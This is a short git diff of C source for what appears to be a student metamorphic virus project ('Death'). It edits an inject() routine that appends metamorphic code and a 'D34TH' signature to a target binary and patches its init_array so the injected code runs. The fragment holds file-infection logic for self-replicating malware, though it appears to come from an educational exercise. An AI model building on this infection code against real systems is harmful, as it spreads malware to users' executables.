@@ -165,6 +165,7 @@ off_t find_signature_offset(int fd)
 }
 
 
+
 void inject(char *path)
 {
 	int fd = open(path, O_RDWR);
@@ -181,8 +182,9 @@ void inject(char *path)
 	snprintf(sig, sizeof(sig),
 			 "D34TH version 1.0 (c)oded by marcheva-dedavid - [00000000]");
 	lseek(fd, 0, SEEK_END);
+	metamorphe(fd, "/home/marc/git_ub/42cursus/death/Death");
+	lseek(fd, 0, SEEK_END);
 	write(fd, sig, strlen(sig));
-	generate_metamorphe(fd);
 	patch_init_array(fd);
 	close(fd);
 }
